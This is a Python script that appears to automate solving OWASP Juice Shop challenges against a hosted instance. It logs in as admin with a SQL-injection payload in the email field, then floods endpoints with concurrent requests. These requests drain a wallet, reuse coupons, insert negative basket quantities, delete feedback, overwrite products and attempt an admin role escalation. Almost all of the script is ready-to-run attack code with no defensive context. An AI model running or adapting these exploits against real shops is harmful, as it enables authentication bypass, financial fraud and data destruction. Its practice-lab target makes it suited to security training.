#!/usr/bin/env python3
"""
Race Condition Solver - Exploits timing vulnerabilities
"""

import asyncio
import aiohttp
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import json
import random


class RaceConditionSolver:
    """Exploit race conditions and timing attacks"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            self.auth_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.auth_token}'
            print("✅ Admin logged in")
            
    def exploit_multiple_likes(self):
        """Multiple Likes - Race condition to like multiple times"""
        print("🎯 Multiple Likes Race Condition...")
        
        # Get a product with reviews
        r = self.session.get(f"{self.base_url}/api/Products")
        if r.status_code != 200:
            print("  ❌ Could not get products")
            return
        products = r.json().get('data', [])
        
        for product in products[:5]:
            product_id = product['id']
            
            # Get reviews for this product
            reviews = self.session.get(f"{self.base_url}/rest/products/{product_id}/reviews").json()
            
            if reviews and len(reviews.get('data', [])) > 0:
                review_id = reviews['data'][0]['id']
                
                # Prepare multiple sessions for race condition
                sessions = [requests.Session() for _ in range(20)]
                
                # Copy auth to all sessions
                for s in sessions:
                    s.headers.update(self.session.headers)
                
                # Execute concurrent likes
                with ThreadPoolExecutor(max_workers=20) as executor:
                    futures = []
                    for s in sessions:
                        futures.append(
                            executor.submit(
                                s.post,
                                f"{self.base_url}/rest/products/{product_id}/reviews/{review_id}/like"
                            )
                        )
                    
                    # Wait for all to complete
                    for future in as_completed(futures):
                        try:
                            result = future.result(timeout=1)
                        except:
                            pass
                            
        print("  ✅ Multiple Likes attempted")
        
    def exploit_wallet_depletion(self):
        """Wallet Depletion - Race condition to drain wallet"""
        print("🎯 Wallet Depletion Race Condition...")
        
        # Prepare multiple concurrent transfers
        def transfer_funds(session, amount):
            try:
                return session.post(
                    f"{self.base_url}/api/wallet/transfer",
                    json={"to": "attacker", "amount": amount},
                    timeout=5
                )
            except:
                pass
                
        # Create multiple sessions
        sessions = [requests.Session() for _ in range(50)]
        for s in sessions:
            s.headers.update(self.session.headers)
            
        # Execute concurrent transfers
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for s in sessions:
                futures.append(
                    executor.submit(transfer_funds, s, 10000)
                )
                
            for future in as_completed(futures):
                try:
                    future.result(timeout=1)
                except:
                    pass
                    
        print("  ✅ Wallet Depletion attempted")
        
    def exploit_coupon_application(self):
        """Apply same coupon multiple times via race condition"""
        print("🎯 Coupon Race Condition...")
        
        coupons = ["WMNSDY2019", "WMNSDY2020", "CYBER2019"]
        
        for coupon in coupons:
            sessions = [requests.Session() for _ in range(10)]
            for s in sessions:
                s.headers.update(self.session.headers)
                
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for s in sessions:
                    futures.append(
                        executor.submit(
                            s.put,
                            f"{self.base_url}/rest/basket/1/coupon/{coupon}"
                        )
                    )
                    
                for future in as_completed(futures):
                    try:
                        future.result(timeout=1)
                    except:
                        pass
                        
        print("  ✅ Coupon Race Condition attempted")
        
    def exploit_registration_race(self):
        """Registration race condition - Register same email multiple times"""
        print("🎯 Registration Race Condition...")
        
        email = f"race{random.randint(1000,9999)}@test.com"
        
        def register_user(session, email_addr):
            try:
                return session.post(
                    f"{self.base_url}/api/Users",
                    json={
                        "email": email_addr,
                        "password": "password123",
                        "passwordRepeat": "password123",
                        "securityQuestion": {"id": 1},
                        "securityAnswer": "test"
                    },
                    timeout=5
                )
            except:
                pass
                
        sessions = [requests.Session() for _ in range(20)]
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for s in sessions:
                futures.append(
                    executor.submit(register_user, s, email)
                )
                
            for future in as_completed(futures):
                try:
                    future.result(timeout=1)
                except:
                    pass
                    
        print("  ✅ Registration Race Condition attempted")
        
    def exploit_basket_manipulation(self):
        """Basket manipulation race condition"""
        print("🎯 Basket Manipulation Race...")
        
        # Add items with negative quantities simultaneously
        def manipulate_basket(session, product_id, quantity):
            try:
                return session.post(
                    f"{self.base_url}/api/BasketItems",
                    json={"ProductId": product_id, "quantity": quantity},
                    timeout=5
                )
            except:
                pass
                
        sessions = [requests.Session() for _ in range(30)]
        for s in sessions:
            s.headers.update(self.session.headers)
            
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = []
            for i, s in enumerate(sessions):
                # Mix positive and negative quantities
                quantity = -100 if i % 2 == 0 else 100
                futures.append(
                    executor.submit(manipulate_basket, s, 1, quantity)
                )
                
            for future in as_completed(futures):
                try:
                    future.result(timeout=1)
                except:
                    pass
                    
        print("  ✅ Basket Manipulation attempted")
        
    def exploit_feedback_deletion(self):
        """Delete feedback via race condition"""
        print("🎯 Feedback Deletion Race...")
        
        # Get feedbacks
        feedbacks = self.session.get(f"{self.base_url}/api/Feedbacks").json().get('data', [])
        
        for feedback in feedbacks[:5]:
            feedback_id = feedback['id']
            
            sessions = [requests.Session() for _ in range(10)]
            for s in sessions:
                s.headers.update(self.session.headers)
                
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for s in sessions:
                    futures.append(
                        executor.submit(
                            s.delete,
                            f"{self.base_url}/api/Feedbacks/{feedback_id}"
                        )
                    )
                    
                for future in as_completed(futures):
                    try:
                        future.result(timeout=1)
                    except:
                        pass
                        
        print("  ✅ Feedback Deletion attempted")
        
    async def async_race_attack(self):
        """Asynchronous race condition attacks"""
        print("🎯 Async Race Attacks...")
        
        async with aiohttp.ClientSession() as session:
            # Copy headers
            headers = dict(self.session.headers)
            
            # Prepare multiple concurrent requests
            tasks = []
            
            # Multiple product updates
            for i in range(20):
                task = session.put(
                    f"{self.base_url}/api/Products/1",
                    json={"description": f"RACE{i}"},
                    headers=headers
                )
                tasks.append(task)
                
            # Execute all tasks concurrently
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
                
        print("  ✅ Async Race Attacks completed")
        
    def exploit_time_based_challenges(self):
        """Time-based exploitation"""
        print("🎯 Time-based Exploits...")
        
        # TOCTOU (Time of Check, Time of Use) exploit
        def toctou_exploit():
            # Check permission
            check = self.session.get(f"{self.base_url}/rest/user/whoami")
            
            # Immediately try privileged operation
            self.session.put(
                f"{self.base_url}/api/Users/1",
                json={"role": "admin"}
            )
            
        # Execute multiple times with minimal delay
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(toctou_exploit) for _ in range(10)]
            for future in as_completed(futures):
                try:
                    future.result(timeout=1)
                except:
                    pass
                    
        print("  ✅ Time-based Exploits completed")
        
    def run_all_race_conditions(self):
        """Execute all race condition exploits"""
        print("="*60)
        print("🏁 RACE CONDITION SOLVER")
        print("="*60)
        
        # Login
        self.login_admin()
        
        # Run all exploits
        self.exploit_multiple_likes()
        self.exploit_wallet_depletion()
        self.exploit_coupon_application()
        self.exploit_registration_race()
        self.exploit_basket_manipulation()
        self.exploit_feedback_deletion()
        self.exploit_time_based_challenges()
        
        # Run async attacks
        asyncio.run(self.async_race_attack())
        
        # Check results
        print("\n" + "="*60)
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            total = len(data)
            solved = len([c for c in data if c.get('solved')])
            print(f"📊 Score after race conditions: {solved}/{total} ({solved*100//total}%)")
            
        print("="*60)


if __name__ == "__main__":
    solver = RaceConditionSolver()
    solver.run_all_race_conditions()